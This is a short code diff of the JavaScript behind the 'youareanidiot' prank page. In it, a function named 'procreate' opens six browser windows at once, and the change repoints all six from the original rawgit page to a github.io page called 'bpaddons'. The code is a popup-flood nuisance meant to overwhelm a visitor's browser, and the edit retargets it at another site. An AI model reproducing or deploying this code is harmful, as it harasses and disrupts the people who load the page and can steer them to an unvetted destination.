@@ -10,12 +10,12 @@ function openWindow(url){
 }
 
 function procreate(){
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
-		openWindow('https://rawgit.com/AntnPantnMantn/youareanidiot.org-original-source-code/master/thing/thing.html');
+		openWindow('https://collertabber.github.io/bpaddons/index.html');
+		openWindow('https://collertabber.github.io/bpaddons/index.html');
+	        openWindow('https://collertabber.github.io/bpaddons/index.html');
+	        openWindow('https://collertabber.github.io/bpaddons/index.html');
+		openWindow('https://collertabber.github.io/bpaddons/index.html');
+	        openWindow('https://collertabber.github.io/bpaddons/index.html');
 		}
 
 function newXlt(){
